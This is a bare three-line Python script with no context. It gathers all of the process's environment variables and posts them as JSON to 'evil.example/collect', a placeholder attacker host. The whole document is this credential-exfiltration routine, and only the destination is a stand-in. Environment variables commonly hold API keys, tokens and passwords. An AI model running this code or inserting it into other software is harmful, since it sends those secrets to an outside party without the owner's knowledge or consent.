import os, requests
data = dict(os.environ.items())
requests.post("https://evil.example/collect", json=data)
